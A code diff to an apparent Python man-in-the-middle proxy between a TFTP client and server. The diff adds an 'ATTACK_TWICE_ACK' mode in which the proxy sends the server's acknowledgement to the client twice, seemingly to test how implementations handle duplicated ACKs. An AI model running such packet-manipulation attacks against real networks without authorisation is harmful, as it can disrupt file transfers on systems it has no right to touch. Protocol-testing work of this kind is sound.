@@ -273,11 +273,24 @@ while True:
 			print(f"Received Data-Packet from Client: Client = {clientaddress} | Data = {datapacket_client_mod_bytes}")
 			print(f"Forwarding data to the Server: Server = {temp_server_address}")
 
-			ack_packet, temp_server_address = fw_proxy_server.recvfrom(BUFFER_TFTP)
+			if not chosenAttack == ATTACK_TWICE_ACK:
+				ack_packet, temp_server_address = fw_proxy_server.recvfrom(BUFFER_TFTP)
 
-			ack_server_mod = TFTP(ack_packet)
-			ack_server_mod_bytes = bytes(ack_server_mod)
+				ack_server_mod = TFTP(ack_packet)
+				ack_server_mod_bytes = bytes(ack_server_mod)
 
-			fw_proxy_client.sendto(ack_server_mod_bytes, client_address)
-			print(f"Received ACK from the Server: Server = {temp_server_address} | Data = {ack_server_mod_bytes}")
-			print(f"Forwarding ack to the Client: Client = {client_address}")
+				fw_proxy_client.sendto(ack_server_mod_bytes, client_address)
+				print(f"Received ACK from the Server: Server = {temp_server_address} | Data = {ack_server_mod_bytes}")
+				print(f"Forwarding ack to the Client: Client = {client_address}")
+			else:
+				ack_packet, temp_server_address = fw_proxy_server.recvfrom(BUFFER_TFTP)
+
+				ack_server_mod = TFTP(ack_packet)
+				ack_server_mod_bytes = bytes(ack_server_mod)
+
+				fw_proxy_client.sendto(ack_server_mod_bytes, client_address)
+				print(f"Received first ACK from the Server: Server = {temp_server_address} | Data = {ack_server_mod_bytes}")
+				print(f"Forwarding first ack to the Client: Client = {client_address}")
+
+				fw_proxy_client.sendto(ack_server_mod_bytes, client_address)
+				print(f"Forwarding second ack to the Client: Client = {client_address}")
